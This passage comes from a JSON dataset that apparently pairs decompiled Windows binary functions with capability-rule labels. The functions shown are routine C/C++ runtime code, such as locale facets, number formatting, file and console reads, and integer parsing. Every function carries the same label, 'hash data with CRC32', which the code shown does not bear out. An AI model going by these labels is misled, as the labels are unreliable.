{\n        *puVar2 = arg_8h[0x14];\n    }\n    return;\n}\n",
        "token_count": 2102
    },
    "0046bb16": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bb16(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "00405704": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405704(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00403ed6(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "00405880": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405880(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402739(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.004039a4();\n                *puVar2 = 0x16;\n                uVar3 = fcn.00403751();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a33f0;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a33f0;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a33f0:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.00404bb5(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 0;\n    if (iVar1 == 8) {\n        fcn.00403aee(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00405a06(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1117
    },
    "0046bd99": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bd99(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = \n    vtable.std::time_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n    ;\n    fcn.00401825();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "00405934": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405934(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar5;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar6;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00401028();\n    if (cVar2 == '\\0') {\ncode_r0x004a1679:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.00405128();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[10];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[10] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar6 = 0,  *(param_1 + 0x31) == 'G')))) {\n                param_1[10] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.00404bb5(iVar6 + 0x15d);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.00405911();\n                param_1[10] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            var_8h = NULL;\n            var_4h = NULL;\n            param_1[0xd] = puVar3;\n            cVar2 = fcn.00402f95(&var_8h);\n            if (cVar2 == '\\0') goto code_r0x004a1679;\n            uVar4 = fcn.00405911();\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            iVar6 = *(param_1 + 0x31);\n            arg_30h = 1;\n            arg_2ch = param_1[2];\n            noname_8 = param_1[1];\n            arg_24h = *param_1;\n            arg_20h = param_1[10];\n            arg_14h = fcn.004030f8();\n            arg_10h = fcn.00405911();\n            fcn.00404156(&var_8h, puVar3, arg_10h, arg_14h, uVar4, iVar6, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n            if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n                fcn.0040229d(param_1[0xd], param_1[2]);\n            }\n            if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n                fcn.00405b23(param_1[0xd], param_1[2]);\n            }\n            pcVar5 = param_1[0xd];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[8] = param_1[8] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xd] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[8] = param_1[8] & 0xfffffff7;\n                *(param_1 + 0x31) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xe] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1158
    },
    "00405943": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405943(uint arg_8h, uint *arg_ch)\n\n{\n    uint32_t *puVar1;\n    \n    if ((arg_8h != '\\0') && (puVar1 = arg_ch + 3,  (*puVar1 >> 9 & 1) != 0)) {\n        fcn.0040420a(arg_ch);\n        LOCK();\n        *puVar1 = *puVar1 & 0xfffffd7f;\n        arg_ch[6] = 0;\n        arg_ch[1] = 0;\n        *arg_ch = 0;\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00405aa6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405aa6(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x3c;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(0x58, uVar4);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            uVar4 = fcn.0040465b(uVar4);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar2 = vtable.std::_Mpunct_unsigned_short_int_.0;\n            *(ppcVar2 + 10) = 0;\n            fcn.004039b3(uVar4, 1);\n            *ppcVar2 = vtable.std::moneypunct_unsigned_short_int__0_.0;\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 448
    },
    "00405b00": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405b00(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00401f2d(8, 0);\n    return;\n}\n",
        "token_count": 93
    },
    "0046bac0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bac0(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "00462223": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462223(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::exception.0;\n    fcn.00405a60(in_ECX + 1);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00405c9f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405c9f(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x3c;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(0x58, uVar4);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            uVar4 = fcn.0040465b(uVar4);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar2 = vtable.std::_Mpunct_wchar_t_.0;\n            *(ppcVar2 + 10) = 1;\n            fcn.004068ca(uVar4, 1);\n            *ppcVar2 = vtable.std::moneypunct_wchar_t__1_.0;\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 448
    },
    "00405d21": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405d21(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *in_ECX;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) == 0) || (*(*in_ECX + 4) != 0)) {\n        uVar1 = fcn.0040464c(arg_8h, *in_ECX);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 != 0xffffffff;\n    }\n    else {\n        uVar1 = CONCAT31(*in_ECX >> 8, 1);\n    }\n    return uVar1;\n}\n",
        "token_count": 154
    },
    "00405d58": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00405d58(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x3c;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(0x58, uVar4);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            uVar4 = fcn.0040465b(uVar4);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar2 = vtable.std::_Mpunct_char_.0;\n            *(ppcVar2 + 10) = 1;\n            fcn.004024cd(uVar4, 1);\n            *ppcVar2 = vtable.std::moneypunct_char__1_.0;\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 443
    },
    "00405df8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405df8(uint8_t *arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t **arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *in_ECX;\n    uint8_t *puVar5;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(*in_ECX + 0xc) >> 0xc & 1) != 0) && (*(*in_ECX + 4) == 0)) {\n        *arg_10h = *arg_10h + arg_ch;\n        return;\n    }\n    piVar3 = *arg_14h;\n    if (piVar3 == NULL) {\n        piVar3 = fcn.004039a4();\n        *arg_14h = piVar3;\n    }\n    iVar1 = *piVar3;\n    puVar5 = arg_8h + arg_ch;\n    *piVar3 = 0;\n    if (arg_8h != puVar5) {\n        do {\n            cVar2 = fcn.00405d21(*arg_8h);\n            if (cVar2 == '\\0') {\n                piVar4 = *arg_14h;\n                if (piVar4 == NULL) {\n                    piVar4 = fcn.004039a4();\n                    *arg_14h = piVar4;\n                }\n                if (*piVar4 != 0x2a) {\n                    *arg_10h = -1;\n                    break;\n                }\n                cVar2 = fcn.00405d21(0x3f);\n                if (cVar2 != '\\0') goto code_r0x004a7a58;\n                *arg_10h = -1;\n            }\n            else {\ncode_r0x004a7a58:\n                *arg_10h = *arg_10h + 1;\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != puVar5);\n    }\n    if ((*piVar3 == 0) && (iVar1 != 0)) {\n        *piVar3 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 519
    },
    "0040605a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040605a(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x3c;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(0x58, uVar4);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            uVar4 = fcn.0040465b(uVar4);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar2 = vtable.std::_Mpunct_wchar_t_.0;\n            *(ppcVar2 + 10) = 0;\n            fcn.004068ca(uVar4, 1);\n            *ppcVar2 = vtable.std::moneypunct_wchar_t__0_.0;\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 447
    },
    "0046bb97": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bb97(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Mpunct_unsigned_short_int_.0;\n    fcn.004043b3();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00406177": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00406177(uint32_t arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint *puVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    char *arg_8h_00;\n    int32_t iVar7;\n    ulong uVar8;\n    uint lpMode;\n    char *var_24h;\n    uint32_t var_20h;\n    uint32_t lpNumberOfBytesRead;\n    uint hConsoleHandle;\n    char *lpBuffer;\n    int32_t var_10h;\n    uint32_t nNumberOfBytesToRead;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar3 = fcn.0040185c();\n        *puVar3 = 0;\n        puVar3 = fcn.004039a4();\n        *puVar3 = 9;\n        return 0xffffffff;\n    }\n    if ((-1 < arg_8h) && (arg_8h < *0x570488)) {\n        var_8h = arg_8h >> 6;\n        iVar7 = (arg_8h & 0x3f) * 0x38;\n        iVar5 = *(var_8h * 4 + 0x570220);\n        var_20h = 1;\n        uVar1 = *(iVar5 + 0x28 + iVar7);\n        var_10h = iVar7;\n        if ((uVar1 & 1) != 0) {\n            if (arg_10h < 0x80000000) {\n                if ((arg_10h == 0) || ((uVar1 & 2) != 0)) {\n                    return 0;\n                }\n                if (arg_ch != NULL) {\n                    hConsoleHandle = *(iVar5 + 0x18 + iVar7);\n                    var_1h._0_1_ = *(iVar5 + 0x29 + iVar7);\n                    arg_8h_00 = NULL;\n                    if (var_1h == '\\x01') {\n                        if ((~arg_10h & 1) == 0) {\ncode_r0x004d1754:\n                            puVar3 = fcn.0040185c();\n                            *puVar3 = 0;\n                            puVar3 = fcn.004039a4();\n                            *puVar3 = 0x16;\n                            fcn.00403751();\n                            pcVar4 = arg_8h_00;\n                        }\n                        else {\n                            nNumberOfBytesToRead = 4;\n                            if (3 < arg_10h >> 1) {\n                                nNumberOfBytesToRead = arg_10h >> 1;\n                            }\n                            pcVar4 = fcn.00403ff3(nNumberOfBytesToRead);\n                            fcn.00406302(0);\n                            fcn.00406302(0);\n                            lpBuffer = pcVar4;\n                            if (pcVar4 != NULL) {\n                                uVar8 = fcn.0040193d(arg_8h, 0, 0, 1);\n                                iVar5 = *(var_8h * 4 + 0x570220);\n                                *(iVar7 + 0x20 + iVar5) = uVar8;\n                                *(iVar7 + 0x24 + iVar5) = uVar8 >> 0x20;\n                                iVar5 = *(var_8h * 4 + 0x570220);\n                                arg_8h_00 = pcVar4;\n                                goto code_r0x004d180c;\n                            }\n                            puVar3 = fcn.004039a4();\n                            *puVar3 = 0xc;\n                            puVar3 = fcn.0040185c();\n                            *puVar3 = 8;\n                        }\ncode_r0x004d1940:\n                        lpNumberOfBytesRead = 0xffffffff;\n                        arg_8h_00 = pcVar4;\n                    }\n                    else {\n                        pcVar4 = arg_ch;\n                        if (var_1h == '\\x02') {\n                            if ((~arg_10h & 1) == 0) goto code_r0x004d1754;\n                            nNumberOfBytesToRead = arg_10h;\n                            lpBuffer = arg_ch;\n                            iVar5 = *(var_8h * 4 + 0x570220);\n                        }\n                        else {\n                            nNumberOfBytesToRead = arg_10h;\n                            lpBuffer = arg_ch;\n                        }\ncode_r0x004d180c:\n                        iVar7 = 0;\n                        uVar6 = nNumberOfBytesToRead;\n                        if ((((*(var_10h + 0x28 + iVar5) & 0x48) != 0) &&\n                            (cVar2 = *(var_10h + 0x2a + iVar5),  cVar2 != '\\n')) && (nNumberOfBytesToRead != 0)) {\n                            iVar7 = 1;\n                            *pcVar4 = cVar2;\n                            lpBuffer = pcVar4 + 1;\n                            uVar6 = nNumberOfBytesToRead - 1;\n                            *(var_10h + 0x2a + *(var_8h * 4 + 0x570220)) = 10;\n                            if (((var_1h != '\\0') &&\n                                (cVar2 = *(var_10h + 0x2b + *(var_8h * 4 + 0x570220)),  cVar2 != '\\n')) && (uVar6 != 0))\n                            {\n                                *lpBuffer = cVar2;\n                                lpBuffer = pcVar4 + 2;\n                                uVar6 = nNumberOfBytesToRead - 2;\n                                iVar7 = 2;\n                                *(var_10h + 0x2b + *(var_8h * 4 + 0x570220)) = 10;\n                                if (((var_1h == '\\x01') &&\n                                    (cVar2 = *(var_10h + 0x2c + *(var_8h * 4 + 0x570220)),  cVar2 != '\\n')) &&\n                                   (uVar6 != 0)) {\n                                    *lpBuffer = cVar2;\n                                    lpBuffer = pcVar4 + 3;\n                                    iVar7 = 3;\n                                    *(var_10h + 0x2c + *(var_8h * 4 + 0x570220)) = 10;\n                                    uVar6 = nNumberOfBytesToRead - 3;\n                                }\n                            }\n                        }\n                        nNumberOfBytesToRead = uVar6;\n                        var_24h = pcVar4;\n                        iVar5 = fcn.0040664a(arg_8h);\n                        pcVar4 = arg_8h_00;\n                        if (((iVar5 == 0) || (-1 < *(var_10h + 0x28 + *(var_8h * 4 + 0x570220)))) ||\n                           (iVar5 = (*_sym.imp.KERNEL32.dll_GetConsoleMode)(hConsoleHandle, &lpMode),  iVar5 == 0)) {\n                            var_20h = var_20h & 0xffffff00;\ncode_r0x004d1961:\n                            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                                              (hConsoleHandle, lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n                            if ((iVar5 == 0) || (arg_10h < lpNumberOfBytesRead)) {\n                                iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                if (iVar5 != 5) {\n                                    if (iVar5 == 0x6d) {\n                                        lpNumberOfBytesRead = 0;\n                                        goto code_r0x004d1943;\n                                    }\n                                    goto code_r0x004d1939;\n                                }\n                                puVar3 = fcn.004039a4();\n                                *puVar3 = 9;\n                                puVar3 = fcn.0040185c();\n                                *puVar3 = 5;\n                                goto code_r0x004d1940;\n                            }\n                        }\n                        else {\n                            if (var_1h != '\\x02') goto code_r0x004d1961;\n                            iVar5 = (*_sym.imp.KERNEL32.dll_ReadConsoleW)\n                                              (hConsoleHandle, lpBuffer, nNumberOfBytesToRead >> 1, &lpNumberOfBytesRead\n                                               , 0);\n                            if (iVar5 == 0) {\n                                iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x004d1939:\n                                fcn.00404b01(iVar5);\n                                goto code_r0x004d1940;\n                            }\n                            lpNumberOfBytesRead = lpNumberOfBytesRead * 2;\n                        }\n                        lpNumberOfBytesRead = iVar7 + lpNumberOfBytesRead;\n                        if (*(var_10h + 0x28 + *(var_8h * 4 + 0x570220)) < '\\0') {\n                            if (var_1h == '\\x02') {\n                                if (var_20h == '\\0') {\n                                    lpNumberOfBytesRead = fcn.004d104b(arg_8h, var_24h, lpNumberOfBytesRead >> 1);\n                                }\n                                else {\n                                    lpNumberOfBytesRead = fcn.004d148a(arg_8h, var_24h, lpNumberOfBytesRead >> 1);\n                                }\n                            }\n                            else {\n                                lpNumberOfBytesRead =\n                                     fcn.004d12de(arg_8h, lpBuffer, lpNumberOfBytesRead, arg_ch, arg_10h >> 1);\n                            }\n                        }\n                    }\ncode_r0x004d1943:\n                    fcn.00406302(arg_8h_00);\n                    return lpNumberOfBytesRead;\n                }\n            }\n            puVar3 = fcn.0040185c();\n            *puVar3 = 0;\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            goto code_r0x004d1a20;\n        }\n    }\n    puVar3 = fcn.0040185c();\n    *puVar3 = 0;\n    puVar3 = fcn.004039a4();\n    *puVar3 = 9;\ncode_r0x004d1a20:\n    fcn.00403751();\n    return 0xffffffff;\n}\n",
        "token_count": 2330
    },
    "004061d1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004061d1(uint arg_8h, uint8_t *arg_ch, uint8_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint8_t *var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    cVar2 = fcn.00403cfb();\n    if (cVar2 != '\\0') {\n        if ((arg_14h == 0) || ((1 < arg_14h && (arg_14h < 0x25)))) {\n            fcn.004057e5(arg_8h);\n            var_ch = 0;\n            var_18h = arg_ch;\n            do {\n                puVar4 = arg_ch;\n                uVar7 = *puVar4;\n                puVar5 = puVar4 + 1;\n                var_4h = var_4h & 0xffffff00 | uVar7;\n                iVar6 = fcn.00403cb0(uVar7, 8, &var_24h);\n                arg_ch = puVar5;\n            } while (iVar6 != 0);\n            var_8h = arg_18h & 0xff;\n            if (uVar7 == 0x2d) {\n                var_8h = var_8h | 2;\ncode_r0x004be7a4:\n                uVar7 = *puVar5;\n                puVar5 = puVar4 + 2;\n                var_4h = var_4h & 0xffffff00 | uVar7;\n            }\n            else if (uVar7 == 0x2b) goto code_r0x004be7a4;\n            arg_ch = puVar5;\n            if ((arg_14h == 0) || (arg_14h == 0x10)) {\n                if (uVar7 - 0x30 < 10) {\n                    iVar6 = uVar7 + -0x30;\n                }\n                else if (uVar7 + 0x9f < 0x1a) {\n                    iVar6 = uVar7 + -0x57;\n                }\n                else if (uVar7 + 0xbf < 0x1a) {\n                    iVar6 = uVar7 + -0x37;\n                }\n                else {\n                    iVar6 = -1;\n                }\n                if (iVar6 == 0) {\n                    uVar1 = *puVar5;\n                    arg_ch = puVar5 + 1;\n                    var_10h = var_10h & 0xffffff00 | uVar1;\n                    if ((uVar1 == 0x78) || (uVar1 == 0x58)) {\n                        if (arg_14h == 0) {\n                            arg_14h = 0x10;\n                        }\n                        uVar7 = *arg_ch;\n                        arg_ch = puVar5 + 2;\n                        var_4h = var_4h & 0xffffff00 | uVar7;\n                    }\n                    else {\n                        if (arg_14h == 0) {\n                            arg_14h = 8;\n                        }\n                        fcn.00402dce(var_10h);\n                    }\n                }\n                else if (arg_14h == 0) {\n                    arg_14h = 10;\n                }\n            }\n            var_10h = 0xffffffff / arg_14h;\n            var_14h = 0xffffffff % arg_14h;\n            while( true ) {\n                if (uVar7 - 0x30 < 10) {\n                    uVar8 = uVar7 - 0x30;\n                }\n                else if (uVar7 + 0x9f < 0x1a) {\n                    uVar8 = uVar7 - 0x57;\n                }\n                